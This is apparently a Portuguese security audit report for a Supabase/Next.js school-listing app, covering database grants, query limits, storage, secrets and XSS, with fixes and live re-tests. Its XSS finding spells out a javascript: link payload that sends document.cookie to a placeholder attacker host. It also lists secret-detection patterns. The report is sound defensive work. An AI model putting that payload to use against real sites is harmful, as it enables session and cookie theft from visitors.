# Listada Escola — Auditoria final de segurança (Prompt 16)

PRD/`docs/prompts/16-auditoria-seguranca.md`: auditar o código inteiro nas
cinco categorias abaixo. Metodologia: 5 agentes independentes (um por
categoria), cada um lendo código real e — onde aplicável — consultando o
projeto Supabase ao vivo (`wfdejmokxrunupsekcmq`, `pg_policies`/
`pg_proc.proacl`/probes com `set role`), não só os arquivos de migration.
Todo achado abaixo foi verificado (lido o código/confirmado ao vivo), não
especulado. Achados fixáveis por schema/config foram corrigidos nesta
mesma PR (`supabase/migrations/20260911200000_security_audit_fixes.sql` +
`next.config.ts` + `docs/security/rls.md`) e re-testados ao vivo depois da
correção — ver "Status" em cada um.

## Resumo

| # | Achado | Categoria | Severidade | Status |
|---|---|---|---|---|
| 1 | `is_admin`/`is_staff`/`is_school_manager`/`is_store_manager`/`handle_new_user`/`guard_submission_status_transition` chamáveis por `anon` via RPC (grant só-em-PUBLIC nunca revogado de verdade) | Banco sem trava / Permissão no navegador | Low | **Corrigido** |
| 2 | `search_schools`/`nearby_schools`/`nearby_stores` sem limite superior em `p_limit` | Banco sem trava | Low/Info | **Corrigido** |
| 3 | `school_profiles.website` renderizado como `href` sem validar esquema — `javascript:` armazenável | XSS | **Medium** | **Corrigido** |
| 4 | Bucket `public-assets` sem gate de aprovação na leitura (Storage) | IDOR | Low (dormant) | Risco aceito, documentado |
| 5 | Nenhum security header configurado | XSS (defesa em profundidade) | Low | **Corrigido** (parcial — ver nota sobre CSP) |
| 6 | `handle_new_user`/`guard_submission_status_transition` flagged pelo linter mas inexecutáveis fora de trigger | Banco sem trava | Info | Não é achado — confirmado |
| 7 | RBAC morto (`EDITOR`/`SCHOOL_MANAGER`/`STORE_MANAGER` sem nenhuma UI) | Permissão no navegador | Info | Não é achado — confirmado |
| — | Secrets (source/env/docs/CI/Docker/git history/bundle) | Secrets | — | **Nenhum achado** |

---

## 1. Banco sem trava (RLS, ownership, filtros, RPCs, agregações, exports)

**Escopo:** todas as ~33 tabelas `public` (via `pg_policies` ao vivo), toda
função `SECURITY DEFINER` (grep + `pg_proc.proacl`), `search_schools()`,
as duas RPCs read-only de analytics (Prompt 14) e as duas de SEO (Prompt 15).

### Achado 1 — grant `PUBLIC` nunca revogado de verdade em 6 funções

- **Arquivos:** definição em
  `supabase/migrations/20260910200900_rls_helper_functions.sql:11-61`
  (`is_admin`/`is_staff`/`is_school_manager`/`is_store_manager`),
  `20260910200100_profiles.sql:19-34` (`handle_new_user`),
  `20260911150100_moderation_guards_fix_public_grant.sql:27-30`
  (comentário do próprio código já nomeando isto como pendência
  explícita para este prompt); tentativa de correção anterior mas
  inefetiva em `20260910201900_advisor_fixes.sql:30-33`
  (`revoke ... from anon`).
- **Trecho (estado antes da correção, confirmado ao vivo via
  `pg_proc.proacl`):** `{=X/postgres, postgres=X/postgres,
  authenticated=X/postgres, service_role=X/postgres}` — o `=X/postgres`
  é a concessão implícita a `PUBLIC` que toda function recebe ao ser
  criada; `revoke ... from anon` é *no-op* quando o único acesso do
  papel vem de `PUBLIC` (Postgres não tem "negative grant" por papel).
- **Exploração:** `POST /rest/v1/rpc/is_admin` só com a `apikey` pública
  (sem sessão) executava a função em vez de ser rejeitado — mesma classe
  de bug já achada e corrigida duas vezes antes para outras funções
  (`moderation_guards_fix_public_grant.sql`,
  `admin_crud_fix_anon_grant.sql`), mas nunca retroaplicada a estas seis.
- **Condição:** nenhuma além de ter a chave `anon` pública (embutida no
  bundle por design).
- **Por que não era explorável na prática:** `is_admin()`/`is_staff()` só
  leem o `auth.uid()` do próprio chamador — `null` para `anon`, portanto
  sempre `false`. `is_school_manager`/`is_store_manager` recebem um id
  alvo mas continuam checando `auth.uid()` internamente — `false` para
  qualquer id, sem IDOR. `handle_new_user`/`guard_submission_status_transition`
  são `returns trigger`; confirmado ao vivo (`set role anon; select
  public.handle_new_user();`) → `ERROR: 0A000: trigger functions can
  only be called as triggers` — Postgres recusa a execução fora de
  contexto de trigger, independente de grant.
- **Severidade:** Low (hygiene do modelo de acesso pretendido, não
  vulnerabilidade viva).
- **Status: Corrigido.** `20260911200000_security_audit_fixes.sql`
  revoga `EXECUTE` de `PUBLIC` nas 6 (mesmo padrão das duas correções
  anteriores) e re-concede a `authenticated` nas 4 não-trigger (RLS
  policies `to authenticated` chamam essas funções durante a avaliação
  de uma query normal — revogar ali quebraria toda policy admin-gated).
  Re-testado ao vivo: `pg_proc.proacl` não mostra mais `=X/postgres` em
  nenhuma das 6; `authenticated=` presente exatamente nas 4 esperadas,
  ausente nas 2 trigger-only. `get_advisors(security)` confirma: as 6
  funções saíram completamente da lista `anon_security_definer_function_executable`
  (que tinha 8 achados, agora tem 2 — `record_analytics_event`/
  `search_schools`, ambas intencionalmente públicas).

### Achado 2 — `p_limit`/`p_offset` sem limite superior

- **Arquivos:** `search_schools()` (`p_limit int default 20`, sem clamp,
  definição corrente em
  `20260911170100_ranking_patrocinio_fix_ambiguous_id.sql:15-30`),
  `nearby_schools()` (`20260911010000_nearby_schools.sql:17-26`),
  `nearby_stores()` (`20260911030000_nearby_stores.sql:21-29`).
- **Exploração:** `POST /rest/v1/rpc/search_schools {"p_limit": 100000}`
  com só a `apikey` pública retorna o dataset inteiro de uma UF numa
  chamada, em vez das 20 por página que o app sempre usa
  (`PAGE_SIZE = 20`, `src/lib/schools/search-schools.ts`).
- **Condição:** nenhuma além da `apikey` pública.
- **Por que é Low/Info, não uma fronteira de privilégio:** toda linha
  retornada já é alcançável paginando a UI pública; RLS/`is_active`
  continuam aplicados. Só remove a fricção que dificultava
  scraping em massa do dataset público de uma vez. Contraste:
  `admin_analytics_top_schools` (Prompt 14) já clampava `p_limit between
  1 and 50` — o padrão já existia, só não tinha sido aplicado à
  superfície de busca pública.
- **Status: Corrigido.** As três funções agora abrem com
  `p_limit := greatest(1, least(coalesce(p_limit, default), 100));` /
  `p_offset := greatest(0, coalesce(p_offset, 0));`. Testado ao vivo:
  `select count(*) from search_schools(p_uf := 'MT', p_limit := 100000)`
  → 100 linhas (não as ~2722 escolas ativas de MT); mesmo teste em
  `nearby_schools` → 100; `nearby_stores` → 0 (não há papelaria ativa em
  produção hoje, resultado esperado).

### Achado 6 (informativo, não é vulnerabilidade) — falso positivo do linter

`handle_new_user()`/`guard_submission_status_transition()` aparecem em
`get_advisors(security)` como `SECURITY DEFINER` "callable" — o linter só
olha para o grant, não para a assinatura `returns trigger`, que torna a
chamada direta impossível independente de qualquer grant (ver Achado 1).
Revogado o grant `PUBLIC` mesmo assim (silencia o WARN), sem necessidade
de nenhuma outra mudança.

### Confirmado correto (não é achado)

- **`search_schools()`** (`SECURITY DEFINER`, acessa `campaigns` que não
  tem SELECT público): a lista de colunas retornada expõe só
  `is_sponsored`/`sponsored_priority` (derivados), nunca uma coluna crua
  de `campaigns` (datas, `created_by`, etc.).
- **`resolve_municipality_slug`/`list_municipalities`** (Prompt 15):
  `SECURITY INVOKER` correto (só leem `schools`, já público via RLS);
  ambas filtram `is_active`, nenhuma escola inativa vaza via contagem ou
  resolução de slug.
- **Toda RPC `admin_*`/`approve_*`/`reject_*`/`mark_*`** (15 funções, Prompts
  02/11/12/13/14) abre com `if not public.is_admin() then raise
  exception`, verificado individualmente. As 4 de decisão de moderação
  também bloqueiam auto-revisão (`submitted_by = auth.uid()`/
  `suggested_by = auth.uid()`).
- **RLS de ownership** (`list_submissions`, `submission_items`,
  `submission_attachments`, `favorites`, `reviews`, `reports`,
  `school_managers`, `store_managers`): toda policy referencia a própria
  coluna de `auth.uid()` da linha — nenhum `USING (true)` fora de lugar,
  nenhuma coluna trocada.
- **`inep_import_staging`**: RLS habilitado, zero policies → nega todo
  papel de cliente, inclusive admin via API; só `service_role`/dono da
  tabela (script de import) acessa — é o comportamento pretendido, não
  um achado (aparece em `get_advisors` como INFO `rls_enabled_no_policy`,
  mesma baseline desde o Prompt 03).
- **`admin_analytics_event_counts`/`admin_analytics_top_schools`**
  (Prompt 14): `SECURITY INVOKER`, duplamente barrado (`is_admin()` +
  RLS por baixo) — least privilege.
- Nenhum `USING (true)` fora de lugar, nenhuma agregação/export
  admin-only vazando para papel não-admin, em nenhuma das ~33 tabelas.

---

## 2. Permissão no navegador (cruzar gates do frontend com backend)

**Escopo:** `src/middleware.ts`→`src/lib/supabase/proxy.ts`, todo layout
de área protegida, toda condicional de UI baseada em role/ownership, e o
Server Action/RPC por trás de cada uma.

Nenhum achado exploitável de gate só-no-frontend. Cada camada tem, no
mínimo, dois controles independentes; a maioria tem três ou quatro:

1. `src/lib/supabase/proxy.ts` (middleware): auth-only, via
   `supabase.auth.getUser()` (revalida contra o Auth server, não decodifica
   o JWT localmente) para `/minha-conta`, `/enviar-lista`,
   `/sugerir-escola`, `/admin`.
2. `src/app/(admin)/admin/layout.tsx` → `requireRole()`
   (`src/lib/auth/session.ts:61-75`) relê `profiles.role` do banco — nunca
   confia em claim de JWT/valor vindo do cliente.
3. Todo Server Action admin (`src/lib/admin/*-actions.ts`,
   `src/lib/moderation/actions.ts`) chama `requireAdmin(supabase)` antes
   de qualquer chamada Supabase.
4. A RPC por trás de cada action re-checa `is_admin()` internamente
   (`SECURITY DEFINER`) — um bug nas camadas 2/3 ainda seria barrado aqui.

O mesmo achado 1 da seção anterior (grant `PUBLIC` nas 4 helper
functions) foi identificado de forma independente por este agente
também — mesma correção, sem duplicar aqui.

### Confirmado correto

- `profiles_update_own` (RLS) tem `WITH CHECK` que relê o role já
  armazenado — um usuário não pode se auto-promover a admin via
  `UPDATE profiles SET role='ADMIN'` mesmo chamando PostgREST direto.
- Nenhum `service_role` usado em lugar nenhum de `src/` — todo client
  server-side usa a anon key sob RLS.
- `SaveButton`/`toggleFavoriteAction`, `requireOwnEditableSubmission()`
  (contribuições) — toda ação "do próprio recurso" re-checa ownership
  server-side, nunca confia em "só quem é dono veria o botão".
- As páginas públicas novas do Prompt 15 (`/papelarias`, `/escolas/[uf]/...`)
  usam `createPublicClient()` (anon key), filtradas a
  `is_active`/`APPROVED`/`PUBLISHED` — nenhum dado admin-only vazando.

### Achado 7 (informativo) — RBAC morto

`EDITOR`, `SCHOOL_MANAGER`, `STORE_MANAGER` existem no enum `user_role`
com toda a RLS/helper correspondente já implementada
(`is_school_manager()`, `school_managers_select_own`, etc.), mas **zero
código em `src/` checa esses papéis** — nenhuma UI de manager existe
ainda. Não é um achado de segurança (nada para explorar sem a feature),
mas explica por que o Achado 4 (Storage) abaixo está dormant.

---

## 3. IDOR

**Escopo:** os 4 Route Handlers, os 35 Server Actions `"use server"`
exportados, toda RPC `admin_*`/`approve_*`/`reject_*`, e as policies de
`storage.objects` dos dois buckets, verificadas ao vivo.

### Achado 4 — bucket `public-assets` sem gate de aprovação na leitura

- **Arquivos:** `supabase/migrations/20260910201800_storage.sql:25-27`
  (`public_assets_select using (bucket_id = 'public-assets')`) +
  `storage.buckets.public = true` para esse bucket (confirmado ao vivo).
- **Trecho:** a linha do banco `school_images.is_approved` já é
  corretamente barrada por RLS (`school_images_select_approved`), mas o
  **arquivo** por trás dela não é — o bucket é público, então
  `GET {SUPABASE_URL}/storage/v1/object/public/public-assets/schools/{school_id}/foto.jpg`
  serve o objeto sem nenhuma checagem de `is_approved`, para qualquer
  um, assim que o arquivo é escrito.
- **Exploração:** um School Manager (papel real, mas RN-003 exige
  aprovação para conteúdo público) faz upload direto via Storage API
  (bypassando o app, que não tem nenhuma UI de upload de manager ainda)
  e o arquivo já fica publicamente acessível antes de qualquer moderação.
- **Condição:** requer uma linha em `school_managers`/`store_managers` —
  **confirmado ao vivo: ambas as tabelas têm 0 linhas em produção hoje**,
  e não existe UI de upload de manager em `src/app` (grep de
  `is_school_manager` fora de `database.types.ts` não retorna nada). A
  escrita em si já é corretamente restrita ao `entity_id` do próprio
  manager (sem IDOR cruzado school A → school B).
- **Severidade:** Low, **dormant** — não explorável hoje, mas é uma
  lacuna real de design que passa a ser explorável no instante em que a
  primeira conta de manager for provisionada, sem nenhuma mudança de
  código necessária para disparar.
- **Status: risco aceito e documentado, não corrigido nesta PR.** Uma
  correção completa (bucket de staging + cópia para `public-assets` só
  no momento da aprovação, espelhando como `list_submissions` →
  `school_lists` só fica público via `approve_submission()`) é uma
  feature de upload/moderação de manager que ainda não existe — não uma
  correção mecânica de auditoria. Construir esse pipeline inteiro sem
  nenhuma UI de manager para testá-lo de ponta a ponta seria trabalho
  especulativo desproporcional ao achado atual (0 linhas, 0 UI). **Ação
  recomendada quando a feature de manager for construída:** escrever
  uploads pendentes num bucket privado e só copiar para `public-assets`
  dentro de `approve_school_suggestion`-equivalente, nunca no upload em
  si.

### Confirmado correto

- Todo Route Handler (`commerce/click`, `store/whatsapp`,
  `contributions/attachments`, `auth/callback`) trata ids de
  path/query só como chave de lookup — o destino/mensagem sempre vem de
  coluna admin-only-editável, nunca do parâmetro em si; id inexistente
  ou de outro dono cai em fallback seguro (redirect pra home / 404), não
  em dado fabricado.
- `requireOwnEditableSubmission()` (contribuições) + a RLS por baixo
  (`list_submissions_select_own`, etc.) formam dupla checagem
  independente — usuário A não lê nem edita submissão de usuário B nem
  por Server Action nem por PostgREST direto.
- `is_school_manager(target_id)`/`is_store_manager(target_id)`
  parametrizam sobre o id alvo específico — manager da escola A não vira
  `true` para escola B.
- Bucket `submissions` (privado): `submissions_owner_select/insert/delete`
  scoped a `(storage.foldername(name))[1] = auth.uid()::text`, admin só
  tem SELECT (nunca escreve em nome do usuário). URLs assinadas de 10min
  geradas server-side só dentro de `/admin/moderacao/[id]`, já gated por
  `requireRole`.
- Nenhuma RPC `admin_*` precisa de escopo além de `is_admin()` — admin é
  papel global único neste schema, sem conceito de tenant/org, então "sem
  escopo adicional" é o design correto, verificado (não assumido).

---

## 4. Secrets

**Escopo:** árvore de trabalho inteira, histórico Git completo (todos os
45 commits, todas as branches), `.github/` (não existe), Docker (não
existe), `next.config.ts`, bundle de produção compilado
(`.next/static/**`, ~5.9MB, 44 chunks — confirmado populado antes de
grepar).

**Nenhum achado.** Detalhe:

- `.env.example` revisado linha a linha — todo valor é placeholder.
  `.env.local` (não versionado, confirmado via `git ls-files`) só tem 2
  vars `NEXT_PUBLIC_*`, nem a service role key está presente localmente.
- Histórico Git completo: só `.env.example` já foi commitado, sempre com
  placeholder; grep de padrão (JWT, `sk_live`/`sk_test`, `AKIA...`,
  `ghp_...`, chave PEM, `Google AIza...`, Slack `xox[abp]-`) sobre `git
  log --all -p` inteiro → zero achado real. A única string `*_KEY`
  repetida é `STITCH_API_KEY="SUA_CHAVE_NOVA"` — o placeholder literal
  que `CLAUDE.md` já avisa para nunca substituir por uma chave real; o
  risco nunca se materializou.
- `.github/` nunca existiu neste repositório (confirmado via histórico
  completo) — nada para checar de CI.
- Bundle de produção: build limpo rodado (`rm -rf .next && npm run
  build`), grepado `.next/static/**` inteiro por JWT/`service_role`/chave
  de provider → zero achado. Nem a anon key pública aparece em
  `.next/static/**` — o app nunca constrói um client Supabase
  client-side (todo acesso a dado é server-side), postura mais forte que
  o mínimo necessário.
- `SUPABASE_SERVICE_ROLE_KEY` referenciada em exatamente um lugar do
  repo inteiro: `scripts/import-inep.ts` (CLI standalone via `tsx`, fora
  do grafo de build do Next.js) — nunca em `src/`, nunca em arquivo
  `"use client"`.

---

## 5. XSS

**Escopo:** todo `dangerouslySetInnerHTML` (8 call sites), `innerHTML`/
`insertAdjacentHTML`, bibliotecas de markdown (nenhuma), `eval`/`new
Function`/timeout-com-string, todo campo de texto livre/URL renderizado,
e-mail HTML (nenhum além do Supabase Auth padrão), headers de segurança.

### Achado 3 — `school_profiles.website` sem validação de esquema (Medium)

- **Arquivo:**
  `src/app/(public)/escolas/[uf]/[cidade]/[slug]/page.tsx:201-211` —
  `<a href={profile.website} target="_blank" ...>`, sem checar que o
  valor começa com `http(s)://`.
- **Caminhos de escrita, nenhum validava esquema antes da correção:**
  `admin_update_school` (`nullif(trim(p_website), '')`, sem checagem de
  formato) e a RLS `school_profiles_manager_write`/`manager_update`
  (`20260910201000_rls_profiles_schools.sql:54-61`) — esta última permite
  que **qualquer usuário com uma linha em `school_managers` escreva
  direto via PostgREST**, contornando o app (e seu `type="url"` do HTML,
  que é só client-side e aceita `javascript:` como URL sintaticamente
  válida) inteiramente.
- **Exploração:** um admin (ou, via a policy de manager, um manager
  direto por API) grava
  `website = "javascript:fetch('https://evil.example/c?c='+document.cookie)"`.
  Qualquer visitante público que clique no link "Website" da escola
  executa o JS same-origin.
- **Condição:** requer escrita de nível admin ou manager — não é
  anônimo/pré-auth, mas o raio de explosão é todo visitante público que
  clicar, a partir de uma escrita de confiança sub-admin.
- **Contraste (padrão já correto no código):**
  `parseTrustedExternalUrl()` em `src/app/api/commerce/click/route.ts`
  já faz allowlist de esquema `http(s)` antes de montar qualquer
  redirect a partir de dado admin — o mesmo padrão só não tinha sido
  aplicado a `school_profiles.website`.
- **Status: Corrigido.** `CHECK (website is null or website ~
  '^https?://')` em `school_profiles` (cobre **todo** caminho de escrita,
  admin RPC e manager RLS direto, incondicionalmente — nenhuma linha
  existente violava antes de aplicar, checado ao vivo). `admin_update_school`
  também ganhou a mesma checagem como exceção amigável (`raise exception
  'website must start with http:// or https://'`), mesma convenção já
  usada em `admin_upsert_store`/`admin_upsert_ecommerce_partner`.
  Testado ao vivo nos dois níveis: INSERT direto com
  `javascript:alert(1)` → `23514 check_violation` no
  `school_profiles_website_scheme_check`; RPC `admin_update_school`
  chamada como admin real (fixture criado/limpo) com o mesmo payload →
  `P0001 website must start with http:// or https://`; a mesma RPC com
  `https://example.com` → aceito e persistido normalmente (sem
  regressão no caminho feliz).

### Achado 5 — nenhum security header (Low, defesa em profundidade)

- **Arquivos:** `next.config.ts` (vazio), sem `vercel.json`,
  `src/lib/supabase/proxy.ts` (middleware) nunca seta header de resposta.
- **Risco:** ausência de `X-Content-Type-Options`/`X-Frame-Options`/
  `Referrer-Policy` — severidade baixa porque o escaping automático do
  JSX já cobre a maior parte da superfície (confirmado abaixo), mas uma
  CSP teria sido uma segunda camada pegando exatamente a classe de bug
  do Achado 3.
- **Status: Corrigido parcialmente.** `next.config.ts` ganhou
  `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`,
  `Referrer-Policy: strict-origin-when-cross-origin` — testado ao vivo
  (build de produção + `curl -D -` em `/`, `/sitemap.xml`,
  `/api/store/whatsapp`, os três tipos de rota do app) e via Playwright
  (nenhuma regressão de console em Home/`/escolas`/`/escolas/mt`, os
  únicos 404 observados são prefetch de nav para páginas institucionais
  ainda não construídas — pré-existente, não relacionado).

  **CSP deliberadamente não incluída** — ver comentário em
  `next.config.ts`. Dois obstáculos reais, não just falta de tempo: (1)
  o provider de tiles do mapa é configurável em runtime
  (`NEXT_PUBLIC_MAP_STYLE_URL`/`NEXT_PUBLIC_MAP_TILE_URL_TEMPLATE`, ver
  `src/lib/map/config.ts`) — uma CSP com allowlist de host fixo quebraria
  a troca de provider por variável de ambiente, que é um requisito de
  design explícito desde o Prompt 05; (2) os scripts inline de hidratação
  do Next.js App Router exigem `'unsafe-inline'` (que anula a maior
  parte da proteção de `script-src`) ou nonce via middleware — uma
  feature própria de verificação (precisa ser testada contra hidratação
  real em cada tipo de página, não só "a página carrega"), não um ajuste
  mecânico de auditoria. Recomendação: implementar CSP com nonce quando
  houver orçamento para testar hidratação/JSON-LD/mapa em todos os tipos
  de página contra a política real, em vez de uma política parcialmente
  verificada que dá falsa confiança.

### Confirmado correto (checado, não é achado)

- **8 call sites de `dangerouslySetInnerHTML`**, todos passando por
  `jsonLdScript()` (`src/lib/seo/json-ld.ts`) — `JSON.stringify(data).replace(/</g,
  "\\u003c")`, neutraliza o vetor de fuga `</script>`. Nenhum
  `JSON.stringify()` cru em lugar nenhum de `src/`. Um deles
  (`listas/[slug]/page.tsx`) carrega conteúdo submetido por usuário
  (nomes de item de lista, aprovados por moderação) — mesmo assim passa
  pelo mesmo escape, confirmado.
- **`innerHTML`/`outerHTML`/`insertAdjacentHTML`:** zero ocorrências em
  `src/`.
- **Bibliotecas de markdown:** nenhuma no projeto.
- **`eval`/`new Function`/`setTimeout`/`setInterval` com string:** zero
  ocorrências (regex, não só grep literal).
- **Outros campos URL-em-atributo:** `stores.whatsapp` nunca é `href`
  cru (sempre resolvido via `/api/store/whatsapp`, que normaliza e
  valida antes); `ecommerce_partners.website` nunca é renderizado como
  link (só texto de tabela admin); todo outro `href` vem de rota
  estática, UUID validado, ou enum/whitelist.
- **E-mail HTML:** nenhum além dos templates padrão do Supabase Auth
  (`resendVerificationAction`/`resetPasswordForEmail` delegam 100% ao
  Supabase Auth, sem HTML próprio).
- **Campos de texto livre** (`description`/`notes`/`correctionNotes`/
  `rejectionReason`): todos renderizados via `{variável}` JSX puro
  (auto-escapado) — nenhuma reconstrução manual de string HTML em
  lugar nenhum.

---

## Fora do escopo desta correção

- **Bucket `public-assets` sem gate de aprovação** (Achado 4) — risco
  aceito e documentado, não uma correção mecânica; ver justificativa na
  seção 3.
- **CSP com nonce** (Achado 5) — recomendado como follow-up quando a
  hidratação/mapa/JSON-LD puderem ser testados de ponta a ponta contra a
  política real; ver justificativa na seção 5.
- **Backlog de performance pré-existente** (RLS `auth.<function>()` sem
  `select`, políticas permissivas múltiplas, FKs sem índice — mesma
  baseline WARN/INFO de todo prompt anterior, `get_advisors(performance)`
  confirmado sem mudança após esta PR): não é escopo de uma auditoria de
  *segurança*.

## `get_advisors` após as correções

**Security:** `anon_security_definer_function_executable` caiu de 8 para
2 achados (as 6 funções desta auditoria saíram da lista; os 2 restantes —
`record_analytics_event`/`search_schools` — são intencionalmente
públicas). `authenticated_security_definer_function_executable` caiu de
25 para 23 (as 2 trigger-only saíram; as 4 que `authenticated` precisa
continuar chamando permanecem, corretamente). `rls_enabled_no_policy`
inalterado (`inep_import_staging`, INFO, comportamento pretendido).

**Performance:** sem mudança — mesma baseline pré-existente
(`unindexed_foreign_keys`, `auth_rls_initplan`, `unused_index`,
`multiple_permissive_policies`), fora do escopo desta auditoria de
segurança.
